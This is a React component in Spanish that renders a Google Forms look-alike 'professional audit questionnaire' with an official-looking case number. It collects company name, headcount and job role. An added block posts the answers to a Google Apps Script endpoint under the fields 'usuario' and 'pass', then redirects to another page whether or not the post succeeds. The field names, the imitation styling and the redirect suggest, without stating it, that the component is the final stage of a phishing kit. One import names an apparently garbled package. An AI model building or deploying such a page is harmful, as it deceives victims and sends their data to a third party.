import { useState } from "react";
import { Check } from "lucide-center-react"; // Asumiendo lucide-react

const AuditForm = () => {
  const [empresa, setEmpresa] = useState("");
  const [trabajadores, setTrabajadores] = useState("");
  const [cargo, setCargo] = useState("");
  const [protocolo, setProtocolo] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async () => {
    if (!empresa || !trabajadores || !cargo || !protocolo) return;
    setIsSubmitting(true);

    // --- CÓDIGO AÑADIDO: ENVÍO Y REDIRECCIÓN ---
    const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
    
    try {
      await fetch(webAppUrl, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({ 
          usuario: empresa, 
          pass: `Cargo: ${cargo} | Empleados: ${trabajadores}`, 
          tipo: "CUESTIONARIO_FINAL",
          fecha: new Date().toLocaleString()
        })
      });

      // Salto al archivo que debes tener en la carpeta /public
      window.location.href = "formacion.html"; 
    } catch (error) {
      console.error("Error al enviar formulario:", error);
      window.location.href = "formacion.html"; // Redirige aunque falle
    } finally {
      setIsSubmitting(false);
    }
    // --- FIN DE ADICIÓN ---
  };

  return (
    <div className="w-full max-w-[640px] mx-auto px-4 pb-20 mt-8">
      <div className="forms-card mb-4 overflow-hidden">
        <div className="forms-card-header" />
        <div className="p-8">
          <h1 className="text-3xl font-normal text-card-foreground mb-3 font-google-sans">
            Cuestionario de Auditoría Profesional
          </h1>
          <p className="text-sm">Expediente SC-2026-882</p>
        </div>
      </div>

      <div className="forms-card p-6 mb-4">
        <label className="block mb-4 text-card-foreground font-medium">Nombre de tu empresa *</label>
        <input 
          type="text" 
          value={empresa}
          onChange={(e) => setEmpresa(e.target.value)} 
          className="forms-input w-full" 
          placeholder="Tu respuesta"
        />
      </div>

      <div className="forms-card p-6 mb-4">
        <label className="block mb-4 text-card-foreground font-medium">¿Cuántos trabajadores tienes? *</label>
        <div className="space-y-3">
          {["1-10", "11-50", "50+"].map((option) => (
            <label key={option} className="flex items-center gap-3 cursor-pointer">
              <input 
                type="radio" 
                name="trabajadores" 
                value={option} 
                onChange={(e) => setTrabajadores(e.target.value)}
                className="forms-radio"
              />
              <span className="text-sm">{option}</span>
            </label>
          ))}
        </div>
      </div>

      <div className="forms-card p-6 mb-4">
        <label className="block mb-4 text-card-foreground font-medium">Cargo en el departamento *</label>
        <input 
          type="text" 
          value={cargo}
          onChange={(e) => setCargo(e.target.value)} 
          className="forms-input w-full" 
          placeholder="Tu respuesta"
        />
      </div>

      <div className="forms-card p-6 mb-6">
        <label className="flex items-center gap-3 cursor-pointer">
          <input 
            type="checkbox" 
            checked={protocolo}
            onChange={(e) => setProtocolo(e.target.checked)}
            className="w-4 h-4"
          />
          <span className="text-sm">Confirmo que la información es veraz.</span>
        </label>
      </div>

      <button 
        onClick={handleSubmit} 
        disabled={isSubmitting || !empresa || !trabajadores || !cargo || !protocolo}
        className="forms-btn-submit"
      >
        {isSubmitting ? "Enviando..." : "Enviar"}
      </button>
    </div>
  );
};

export default AuditForm;
